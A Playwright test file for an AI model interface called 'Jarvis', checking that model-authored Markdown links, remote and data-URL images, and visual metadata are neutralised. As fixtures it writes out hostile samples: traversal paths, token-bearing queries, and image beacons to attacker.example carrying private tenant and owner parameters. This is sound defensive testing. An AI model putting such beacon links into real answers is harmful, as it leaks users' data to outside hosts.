/**
 * CHANGE LOG
 * -----------------------------------------------------------------------------
 * SEQ                 | AUTHOR                      | DESCRIPTION
 * -----------------------------------------------------------------------------
 * 1 | maintainer@emeraldcoastsystemsgroup.com   | Split verbatim out of tests/jarvis-rich-response-integration.spec.ts at the 1000-code-line cap: the visual-trust group — workspace Markdown link bridging, model-authored remote/data image links staying inert, and visual metadata rejected unless its URL is exactly the owner-scoped artifact URL.
 */

import { expect, test } from '@playwright/test';
import {
  ARTIFACT_ID,
  ARTIFACT_URL,
  SVG,
  fulfillJarvis,
  installSpeechStub,
  json,
} from './helpers/jarvis-rich-response-fixtures';

test('bridges only strict workspace Markdown files to the authenticated code surface', async ({ page }) => {
  await installSpeechStub(page);
  await page.route('**/*', fulfillJarvis);
  await page.goto('http://jarvis.test/api/jarvis/');
  const ticketId = '08ad8960-2920-4761-9cf4-6d126b1119b7';
  const workspacePath = `/app/workspace-shared/${ticketId}/deliverables/order-options.md`;

  const hrefs = await page.evaluate(({ ticketId: id, workspacePath: pathName }) => {
    const markdown = [
      `[notes](${pathName})`,
      `[traversal](/app/workspace-shared/${id}/deliverables/../private.md)`,
      `[query](${pathName}?token=secret)`,
      '[protocol-relative](//attacker.example/file.md)',
      '[Uber Eats](https://www.ubereats.com/search?q=ice-cream)',
    ].join('\n');
    const host = document.createElement('div');
    host.innerHTML = (window as any).renderMarkdown(markdown);
    return [...host.querySelectorAll('a')].map((link) => link.getAttribute('href'));
  }, { ticketId, workspacePath });

  expect(hrefs).toEqual([
    `/code?file=${encodeURIComponent(workspacePath)}`,
    '#',
    '#',
    '#',
    'https://www.ubereats.com/search?q=ice-cream',
  ]);
});

test('keeps model-authored remote and data image Markdown inert without making hostile requests', async ({ page }) => {
  await installSpeechStub(page);
  const hostileRequests: string[] = [];
  page.on('request', (request) => {
    if (new URL(request.url()).hostname === 'attacker.example') hostileRequests.push(request.url());
  });
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url());
    if (url.hostname === 'attacker.example') {
      return route.fulfill({ contentType: 'image/svg+xml', body: SVG });
    }
    if (url.pathname === '/api/jarvis/ask/result') {
      return json(route, {
        status: 'done',
        answer: [
          'These model-authored image links must remain readable but inert.',
          '![remote beacon](https://attacker.example/pixel.svg?tenant=private)',
          '![inline data](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)',
        ].join('\n'),
      });
    }
    return fulfillJarvis(route);
  });
  await page.goto('http://jarvis.test/api/jarvis/');
  await page.locator('#typeToggle').click();
  await page.locator('#typein').fill('Show the model-authored images.');
  await page.locator('#typer button[type="submit"]').click();

  const answer = page.locator('#convo .msg.bot').last();
  await expect(answer).toContainText('These model-authored image links');
  await expect(answer.locator('.md-image-note')).toHaveCount(2);
  await expect(answer.locator('.md-image-note').nth(0)).toHaveText('Image link not loaded: remote beacon');
  await expect(answer.locator('.md-image-note').nth(1)).toHaveText('Image link not loaded: inline data');
  await expect(answer.locator('img')).toHaveCount(0);
  await page.waitForTimeout(100);
  expect(hostileRequests).toEqual([]);
  await expect(page.locator('body')).not.toHaveClass(/jarvis-response-active/);
  await expect(page.locator('#responseStage')).toHaveAttribute('data-state', 'idle');
  await expect(page.locator('#responseStageImage')).not.toHaveClass(/visible/);
  await expect(page.locator('#responseStageImage')).not.toHaveAttribute('src', /.+/);
});

test('accepts an owner-scoped gallery SVG while keeping its model-authored remote image inert', async ({ page }) => {
  await installSpeechStub(page);
  const hostileRequests: string[] = [];
  page.on('request', (request) => {
    if (new URL(request.url()).hostname === 'attacker.example') hostileRequests.push(request.url());
  });
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url());
    if (url.hostname === 'attacker.example') {
      return route.fulfill({ contentType: 'image/svg+xml', body: SVG });
    }
    if (url.pathname === '/api/jarvis/ask/result') {
      return json(route, {
        status: 'done',
        answer: [
          'I found two live product options. The saved gallery is the trusted visual.',
          '![untrusted product beacon](https://attacker.example/product.svg?owner=private)',
        ].join('\n'),
        visual: {
          artifactId: ARTIFACT_ID,
          type: 'image',
          kind: 'gallery',
          url: ARTIFACT_URL,
          mimeType: 'image/svg+xml',
          alt: 'Two live product options with product photos, names, and prices',
          width: 1280,
          height: 720,
        },
      });
    }
    return fulfillJarvis(route);
  });
  await page.goto('http://jarvis.test/api/jarvis/');
  await page.locator('#typeToggle').click();
  await page.locator('#typein').fill('Show me the product options.');
  await page.locator('#typer button[type="submit"]').click();

  const answer = page.locator('#convo .msg.bot').last();
  await expect(answer.locator('.md-image-note')).toHaveText('Image link not loaded: untrusted product beacon');
  await expect(answer.locator('img[src*="attacker.example"]')).toHaveCount(0);
  await expect(page.locator('#responseStageImage')).toHaveAttribute('src', ARTIFACT_URL, { timeout: 6_000 });
  await expect(page.locator('#responseStageImage')).toHaveAttribute(
    'alt',
    'Two live product options with product photos, names, and prices',
  );
  await expect(page.locator('#responseStageImage')).toHaveClass(/visible/);
  expect(hostileRequests).toEqual([]);

  const rejectedRemoteMetadata = await page.evaluate(({ artifactId }) => (window as any).trustedVisualMetadata({
    artifactId,
    type: 'image',
    kind: 'gallery',
    url: 'https://attacker.example/gallery.svg',
    mimeType: 'image/svg+xml',
    alt: 'Untrusted remote gallery',
    width: 1280,
    height: 720,
  }), { artifactId: ARTIFACT_ID });
  expect(rejectedRemoteMetadata).toBeNull();
});

test('ignores visual metadata whose URL is not the exact owner-scoped artifact URL', async ({ page }) => {
  await installSpeechStub(page);
  const attemptedImageRequests: string[] = [];
  const invalidVisuals: Array<{ label: string; overrides: Record<string, unknown> }> = [
    { label: 'cross-origin', overrides: { url: 'https://attacker.example/stolen.svg' } },
    { label: 'protocol-relative', overrides: { url: '//attacker.example/stolen.svg' } },
    { label: 'same-origin absolute', overrides: { url: `http://jarvis.test${ARTIFACT_URL}` } },
    { label: 'data URL', overrides: { url: 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=' } },
    { label: 'other root-relative', overrides: { url: '/uploads/untrusted.svg' } },
    { label: 'mismatched artifact', overrides: { url: '/api/jarvis/visuals/22222222-2222-4222-8222-222222222222' } },
    { label: 'query-suffixed', overrides: { url: `${ARTIFACT_URL}?token=private` } },
    { label: 'string dimensions', overrides: { width: '960' } },
    { label: 'fractional dimensions', overrides: { height: 539.5 } },
    { label: 'oversized alt', overrides: { alt: 'A'.repeat(421) } },
    { label: 'unknown kind', overrides: { kind: 'arbitrary-html' } },
    { label: 'wrong MIME', overrides: { mimeType: 'image/png' } },
  ];
  let resultCount = 0;
  page.on('request', (request) => {
    const url = new URL(request.url());
    if (request.resourceType() === 'image'
      || url.hostname === 'attacker.example'
      || (url.pathname === ARTIFACT_URL && url.search)) {
      attemptedImageRequests.push(request.url());
    }
  });
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url());
    if (url.hostname === 'attacker.example') {
      return route.fulfill({ contentType: 'image/svg+xml', body: SVG });
    }
    if (url.pathname === '/api/jarvis/ask/result') {
      const invalid = invalidVisuals[resultCount++];
      return json(route, {
        status: 'done',
        answer: `Ignored ${invalid.label} visual metadata.`,
        visual: {
          artifactId: ARTIFACT_ID,
          type: 'image',
          kind: 'weather',
          url: ARTIFACT_URL,
          mimeType: 'image/svg+xml',
          alt: `${invalid.label} visual`,
          width: 960,
          height: 540,
          ...invalid.overrides,
        },
      });
    }
    return fulfillJarvis(route);
  });
  await page.goto('http://jarvis.test/api/jarvis/');
  await page.locator('#typeToggle').click();

  for (const invalid of invalidVisuals) {
    await page.locator('#typein').fill(`Try the ${invalid.label} visual.`);
    await page.locator('#typer button[type="submit"]').click();
    await expect(page.locator('#convo')).toContainText(`Ignored ${invalid.label} visual metadata.`);
    await expect(page.locator('body')).not.toHaveClass(/jarvis-response-active/);
    await expect(page.locator('#responseStage')).toHaveAttribute('data-state', 'idle');
    await expect(page.locator('#responseStageImage')).not.toHaveClass(/visible/);
    await expect(page.locator('#responseStageImage')).not.toHaveAttribute('src', /.+/);
    await expect(page.locator('#discussionDrawer .discussion-visual-thumb')).toHaveCount(0);
  }

  await page.waitForTimeout(100);
  expect(resultCount).toBe(invalidVisuals.length);
  expect(attemptedImageRequests).toEqual([]);
});
